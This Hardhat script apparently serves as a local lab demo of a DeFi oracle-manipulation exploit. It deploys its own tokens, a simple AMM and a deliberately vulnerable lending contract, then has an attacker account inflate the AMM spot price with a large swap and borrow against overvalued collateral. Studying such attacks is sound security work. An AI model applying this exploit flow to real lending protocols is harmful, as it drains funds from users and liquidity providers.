//this script deploys fresh stack, seeds AMM and lending pool, funds attacker, manipulates price by swapping a large amount of A, then borrows against inflated collateral value.

const hre = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();

  // Deploy fresh stack (or import addresses if you already deployed)
  const TokenA = await hre.ethers.getContractFactory("TokenA");
  const TokenB = await hre.ethers.getContractFactory("TokenB");
  const AMM = await hre.ethers.getContractFactory("SimpleAMM");
  const Lending = await hre.ethers.getContractFactory("VulnerableLending");

  const tokenA = await TokenA.deploy();
  const tokenB = await TokenB.deploy();
  await tokenA.waitForDeployment();
  await tokenB.waitForDeployment();

  const amm = await AMM.deploy(await tokenA.getAddress(), await tokenB.getAddress());
  await amm.waitForDeployment();

  const lending = await Lending.deploy(await tokenA.getAddress(), await tokenB.getAddress(), await amm.getAddress());
  await lending.waitForDeployment();

  // seed AMM
  const seedA = hre.ethers.parseEther("1000");
  const seedB = hre.ethers.parseEther("1000");
  await tokenA.approve(await amm.getAddress(), seedA);
  await tokenB.approve(await amm.getAddress(), seedB);
  await amm.addLiquidity(seedA, seedB);

  // fund lending pool
  const fundB = hre.ethers.parseEther("5000");
  await tokenB.approve(await lending.getAddress(), fundB);
  await lending.fundPool(fundB);

  // give attacker some TokenA (collateral)
  await tokenA.transfer(await attacker.getAddress(), hre.ethers.parseEther("100"));

  // attacker deposits small collateral (100 A)
  await tokenA.connect(attacker).approve(await lending.getAddress(), hre.ethers.parseEther("100"));
  await lending.connect(attacker).depositCollateral(hre.ethers.parseEther("100"));
  console.log("Attacker deposited 100 A as collateral");

  // show spot price before manipulation
  let priceBefore = await amm.getSpotPrice();
  console.log("Spot price before:", hre.ethers.formatEther(priceBefore));

  // now attacker manipulates AMM price by swapping A -> B (swap large amount they already hold or got)
  // For the manual demo we give attacker lots of A to swap (simulate attacker capital)
  await tokenA.transfer(await attacker.getAddress(), hre.ethers.parseEther("1000")); // fund attacker
  await tokenA.connect(attacker).approve(await amm.getAddress(), hre.ethers.parseEther("1000"));

  // attacker swaps 800 A -> B to push price up (B per A increases)
  const swapAmount = hre.ethers.parseEther("800");
  await amm.connect(attacker).swapAForB(swapAmount);
  console.log("Attacker swapped 800 A to move price");

  // spot price after manipulation
  let priceAfter = await amm.getSpotPrice();
  console.log("Spot price after:", hre.ethers.formatEther(priceAfter));

  // compute allowed borrow now (attacker's collateral * price * LTV)
  const coll = await lending.collateralA(attacker.address);
  const spot = priceAfter; // scaled
  const collValueB = (coll * spot) / hre.ethers.parseEther("1");
  const allowed = collValueB * 5000n / 10000n; // LTV 50% (bigint math)
  console.log("Allowed borrow in B (approx, wei):", allowed.toString());

  // attacker attempts to borrow allowed amount (convert bigint to normal number for call)
  const borrowAmount = allowed / 1n; // directly use allowed as wei
  // Note: JS BigInt to ethers BigNumber conversion
  await lending.connect(attacker).borrow(borrowAmount.toString());
  console.log("Attacker borrowed against manipulated price");

  // attacker now holds borrowed TokenB â€” show balances
  const balB = await tokenB.balanceOf(attacker.address);
  console.log("Attacker TokenB balance:", hre.ethers.formatEther(balB));
}

main().catch((e)=>{ console.error(e); process.exitCode = 1; });

